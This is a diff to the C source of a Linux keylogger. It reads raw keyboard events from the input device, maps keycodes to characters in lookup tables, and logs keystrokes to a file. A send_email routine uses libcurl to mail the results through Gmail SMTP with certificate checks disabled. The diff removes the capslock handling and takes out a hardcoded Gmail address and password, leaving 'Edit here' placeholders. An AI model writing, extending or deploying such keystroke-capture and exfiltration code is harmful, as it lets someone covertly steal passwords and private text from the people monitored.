@@ -180,7 +180,7 @@ char* find_key(int code){
         //case 54: return "[SHIFT]";
         case 55: return "*";
         case 57: return "[SPACE]";
-        //case 58: return "[CAPSLOCK]";
+        case 58: return "[CAPSLOCK]";
         case 102: return "[HOME]";
         case 103: return "[UP]";
         case 104: return "[PGUP]";
@@ -247,7 +247,7 @@ char* find_key_shifted(int code){
         case 52: return ">";
         case 53: return "?";
         case 57: return "[SPACE]";
-        //case 58: return "[CAPSLOCK]";
+        case 58: return "[CAPSLOCK]";
         case 102: return "[HOME]";
         case 103: return "[UP]";
         case 104: return "[PGUP]";
@@ -260,71 +260,6 @@ char* find_key_shifted(int code){
     }
 }
 
-char* find_key_capslock(int code){
-    switch(code){
-        case 2: return "1";
-        case 3: return "2";
-        case 4: return "3";
-        case 5: return "4";
-        case 6: return "5";
-        case 7: return "6";
-        case 8: return "7";
-        case 9: return "8";
-        case 10: return "9";
-        case 11: return "0";
-        case 12: return "-";
-        case 13: return "=";
-        case 14: return "[BACKSPACE]";
-        case 15: return "[TAB]";
-        case 16: return "Q";
-        case 17: return "W";
-        case 18: return "E";
-        case 19: return "R";
-        case 20: return "T";
-        case 21: return "Y";
-        case 22: return "U";
-        case 23: return "I";
-        case 24: return "O";
-        case 25: return "P";
-        case 26: return "{";
-        case 27: return "}";
-        case 28: return "[ENTER]";
-        case 29: return "[CTRL]";
-        case 30: return "A";
-        case 31: return "S";
-        case 32: return "D";
-        case 33: return "F";
-        case 34: return "G";
-        case 35: return "H";
-        case 36: return "J";
-        case 37: return "K";
-        case 38: return "L";
-        case 39: return ";";
-        case 40: return "'";
-        case 41: return "`";
-        case 43: return "\\";
-        case 44: return "Z";
-        case 45: return "X";
-        case 46: return "C";
-        case 47: return "V";
-        case 48: return "B";
-        case 49: return "N";
-        case 50: return "M";
-        case 51: return ",";
-        case 52: return ".";
-        case 53: return "/";
-        case 57: return "[SPACE]";
-        case 102: return "[HOME]";
-        case 103: return "[UP]";
-        case 104: return "[PGUP]";
-        case 105: return "[LEFT]";
-        case 106: return "[RIGHT]";
-        case 107: return "[END]";
-        case 108: return "[DOWN]";
-        case 109: return "[PGDN]";
-        default: return "";
-    }
-}
 
 struct upload_status {
   size_t bytes_read;
@@ -389,8 +324,8 @@ int send_email(){
 
     curl = curl_easy_init();
     if(curl) {
-        curl_easy_setopt(curl, CURLOPT_USERNAME, "doi2xuyenviet7@gmail.com");
-        curl_easy_setopt(curl, CURLOPT_PASSWORD, "@123456789@");
+        curl_easy_setopt(curl, CURLOPT_USERNAME, ""); ///////////////// Edit here
+        curl_easy_setopt(curl, CURLOPT_PASSWORD, ""); ///////////////// Edit here
         curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
         curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -441,34 +376,22 @@ void *keylogger(){
     FILE * fp_out = fopen("log.txt", "a");
     struct input_event event;
     int shift_flag = 0;
-    int capslock_flag = 0;
-    int capslock_count = 2;
+
     int events = open(event_file_path, O_RDONLY);
     while(1){
         read(events,&event, sizeof(event));
         if(event.type == 1 && event.value == 1){
             if (SHIFT(event.code))
                 shift_flag = 1;
-            if (CAPSLOCK(event.code)){
-                capslock_flag = 1;
-                capslock_count++;
-                //printf("%s\n","CAPSLOCK ON");
-            }
-            if (!shift_flag && capslock_flag && !SHIFT(event.code))
-                fputs(find_key_capslock(event.code), fp_out);
-            if (shift_flag && !capslock_flag && !SHIFT(event.code))
+            if (shift_flag && !SHIFT(event.code))
                 fputs(find_key_shifted(event.code), fp_out);
-            else if ((shift_flag == capslock_flag) && !SHIFT(event.code))
+            else if (!shift_flag && !SHIFT(event.code))
                 fputs(find_key(event.code), fp_out);
             fflush(fp_out);
         }
         else if (event.type == 1 && event.value == 0){
             if (SHIFT(event.code)){
                 shift_flag = 0;
-            }
-            if (CAPSLOCK(event.code) && (capslock_count % 2 == 0)){
-                capslock_flag = 0;
-                printf("CAPSLOCK OFF\n");
             }
         }
         //gettimeofday(&current_time, 0);
